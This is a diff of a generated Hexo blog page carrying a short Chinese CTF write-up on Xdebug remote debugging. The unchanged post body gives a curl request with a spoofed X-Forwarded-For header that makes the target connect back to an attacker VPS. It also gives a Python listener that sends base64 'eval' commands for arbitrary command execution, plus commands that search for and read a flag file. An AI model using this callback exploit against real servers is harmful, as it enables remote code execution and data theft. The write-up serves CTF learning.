@@ -10,9 +10,7 @@
 
     <!--Description-->
     
-        <meta name="description" content="Xdebug如何确定开启动态调试？
-在vps上监听9000端口  nc -l -vv -p 9000
-再打开一个窗口执行 curl &amp;#39;http://TARGET_IP/index.php?XDEBUG_SESSION_START=phpstrom&amp;#39; -H &amp;quot;X-Forwar">
+        <meta name="description" content="对未来的最大慷慨，就是把一切都献给现在！">
     
 
     <!--Author-->
@@ -27,9 +25,11 @@
 
     <!--Open Graph Description-->
     
+        <meta property="og:description" content="对未来的最大慷慨，就是把一切都献给现在！">
+    
 
     <!--Open Graph Site Name-->
-    <meta property="og:site_name" content="Hexo">
+    <meta property="og:site_name" content="Luc1fer&#39;blog">
 
     <!--Type page-->
     
@@ -44,7 +44,7 @@
 
     <!-- Title -->
     
-    <title>Xdebug - Hexo</title>
+    <title>Xdebug - Luc1fer&#39;blog</title>
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
@@ -92,12 +92,6 @@
             <li class="menu-item">
                 <a href="/archives">
                     Archives
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/about.html">
-                    About
                 </a>
             </li>
             
@@ -151,8 +145,6 @@
                 <span class="date">2019-08-17</span>
             
             
-                <a href="#disqus_thread" class="comments">Comments</a>
-            
             
                 <span class="category">
                     <a href="/categories/ctf/">ctf</a>
@@ -167,7 +159,9 @@
         
 
         <!-- Post Content -->
-        <h1 id="Xdebug"><a href="#Xdebug" class="headerlink" title="Xdebug"></a>Xdebug</h1><p>如何确定开启动态调试？</p>
+        <p>你从未见过的船新知识点</p>
+<a id="more"></a>
+<h1 id="Xdebug"><a href="#Xdebug" class="headerlink" title="Xdebug"></a>Xdebug</h1><p>如何确定开启动态调试？</p>
 <p>在vps上监听9000端口  <code>nc -l -vv -p 9000</code></p>
 <p>再打开一个窗口执行 <code>curl &#39;http://TARGET_IP/index.php?XDEBUG_SESSION_START=phpstrom&#39; -H &quot;X-Forwarded-For: VPS_IP&quot;</code></p>
 <p>如果此时监听窗口收到返回的xml数据则证明开启了动态调试。</p>
@@ -175,7 +169,7 @@
 <pre><code>#!/usr/bin/python2
 import socket
 
-ip_port = (&#39;0.0.0.0&#39;,9000)
+ip_port = (&apos;0.0.0.0&apos;,9000)
 sk = socket.socket()
 sk.bind(ip_port)
 sk.listen(10)
@@ -185,10 +179,10 @@ while True:
     client_data = conn.recv(1024)
     print(client_data)
 
-    data = raw_input(&#39;&gt;&gt; &#39;)
-    conn.sendall(&#39;eval -i 1 -- %s\x00&#39; % data.encode(&#39;base64&#39;))</code></pre><p>在vps上执行脚本，然后执行上文的curl代码触发Xdebug即可任意命令执行</p>
+    data = raw_input(&apos;&gt;&gt; &apos;)
+    conn.sendall(&apos;eval -i 1 -- %s\x00&apos; % data.encode(&apos;base64&apos;))</code></pre><p>在vps上执行脚本，然后执行上文的curl代码触发Xdebug即可任意命令执行</p>
 <p>我们首先<code>system(&#39;find /|grep flag&#39;)</code> 找一下flag在哪，然后读取</p>
-<pre><code>system(&#39;cat /home/flag.txt&#39;)</code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<pre><code>system(&apos;cat /home/flag.txt&apos;)</code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
 <p><a href="http://0sec.com.cn/2018-05-10/" target="_blank" rel="noopener">http://0sec.com.cn/2018-05-10/</a></p>
 </blockquote>
 
@@ -204,16 +198,6 @@ while True:
     
 
     <!-- Comments -->
-    
-    <div class="comments">
-        
-<div id="disqus_thread">
-    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-</div>
-
-
-
-    </div>
     
 
 </div>
@@ -234,7 +218,7 @@ while True:
             <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
                 <h2>About</h2>
                 <p>
-                    This theme was developed by <a href="https://github.com/klugjo">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
+                    This theme was developed by <a href="">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
                 </p>
             </div>
             
@@ -255,7 +239,7 @@ while True:
             </li>
             
             <li>
-                <a class="footer-post" href="/2019/08/19/Black_magic/">black_magic</a>
+                <a class="footer-post" href="/2019/08/19/Black-magic/">black_magic</a>
             </li>
             
         </ul>
@@ -273,11 +257,11 @@ while True:
         </li>
         
         <li>
-            <a class="footer-post" href="/categories/wp/">wp</a>
+            <a class="footer-post" href="/categories/docker/">docker</a>
         </li>
         
         <li>
-            <a class="footer-post" href="/categories/docker/">docker</a>
+            <a class="footer-post" href="/categories/wp/">wp</a>
         </li>
         
         <li>
@@ -353,18 +337,6 @@ while True:
 <script src="/js/main.js"></script>
 
 <!-- Disqus Comments -->
-
-<script type="text/javascript">
-    var disqus_shortname = 'klugjotest';
-
-    (function(){
-        var dsq = document.createElement('script');
-        dsq.type = 'text/javascript';
-        dsq.async = true;
-        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
-        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-    }());
-</script>
 
 
 
